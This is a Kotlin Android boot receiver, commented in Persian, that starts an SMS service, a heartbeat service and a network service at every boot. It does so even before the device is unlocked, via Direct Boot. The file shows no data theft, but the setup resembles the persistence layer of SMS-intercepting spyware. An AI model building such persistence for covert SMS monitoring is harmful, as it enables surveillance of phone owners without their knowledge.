package com.example.test

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.example.test.utils.DirectBootHelper

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📢 BOOT RECEIVER CALLED")
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "Action: ${intent?.action}")

        if (context == null || intent == null) {
            Log.e(TAG, "❌ Context or Intent is NULL!")
            return
        }

        // ⭐ Log کردن وضعیت Direct Boot
        DirectBootHelper.logStatus(context)

        // چک کردن همه انواع Boot Actions
        when (intent.action) {
            Intent.ACTION_LOCKED_BOOT_COMPLETED -> {
                // ⭐ قبل از Unlock - Direct Boot!
                Log.d(TAG, "🔐 LOCKED_BOOT_COMPLETED - Device still LOCKED")
                Log.d(TAG, "🚀 Starting services with Direct Boot support...")
                startAllServices(context, isLocked = true)
            }
            Intent.ACTION_BOOT_COMPLETED -> {
                // بعد از Unlock - Normal Boot
                Log.d(TAG, "🔓 BOOT_COMPLETED - Device UNLOCKED")
                Log.d(TAG, "🚀 Starting services normally...")
                
                // Migrate storage if needed
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    DirectBootHelper.migrateStorageIfNeeded(context)
                }
                
                startAllServices(context, isLocked = false)
            }
            "android.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_REBOOT -> {
                Log.d(TAG, "🔄 Quick boot or reboot detected")
                startAllServices(context, isLocked = false)
            }
            Intent.ACTION_USER_UNLOCKED -> {
                // ⭐ کاربر گوشی رو Unlock کرد
                Log.d(TAG, "🔓 USER_UNLOCKED - User just unlocked device")
                
                // Migrate storage
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    DirectBootHelper.migrateStorageIfNeeded(context)
                }
                
                // ممکنه سرویس‌ها نیاز به restart داشته باشن
                startAllServices(context, isLocked = false)
            }
            else -> {
                Log.w(TAG, "⚠️ Unknown action: ${intent.action}")
            }
        }
        
        Log.d(TAG, "════════════════════════════════════════")
    }

    private fun startAllServices(context: Context, isLocked: Boolean) {
        try {
            // ⭐ استفاده از Context مناسب برای Direct Boot
            val workingContext = DirectBootHelper.getContext(context)
            
            if (isLocked) {
                Log.d(TAG, "⚠️ Device LOCKED - Starting with limited functionality")
            } else {
                Log.d(TAG, "✅ Device UNLOCKED - Starting with full functionality")
            }
            
            // 1. Start SMS Service
            startSmsService(workingContext)

            // 2. Start Heartbeat Service
            startHeartbeatService(workingContext)

            // 3. Start Network Service
            startNetworkService(workingContext)
            
            // 4. ⭐ Schedule JobScheduler
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(workingContext)
                Log.d(TAG, "✅ JobScheduler scheduled")
            }

            Log.d(TAG, "✅ All services started successfully")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error starting services", e)
        }
    }

    private fun startSmsService(context: Context) {
        try {
            val smsIntent = Intent(context, SmsService::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(smsIntent)
                Log.d(TAG, "✅ SmsService started (Foreground)")
            } else {
                context.startService(smsIntent)
                Log.d(TAG, "✅ SmsService started")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService", e)
        }
    }

    private fun startHeartbeatService(context: Context) {
        try {
            val heartbeatIntent = Intent(context, HeartbeatService::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(heartbeatIntent)
                Log.d(TAG, "✅ HeartbeatService started (Foreground)")
            } else {
                context.startService(heartbeatIntent)
                Log.d(TAG, "✅ HeartbeatService started")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService", e)
        }
    }

    private fun startNetworkService(context: Context) {
        try {
            val networkIntent = Intent(context, NetworkService::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(networkIntent)
                Log.d(TAG, "✅ NetworkService started (Foreground)")
            } else {
                context.startService(networkIntent)
                Log.d(TAG, "✅ NetworkService started")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start NetworkService", e)
        }
    }
}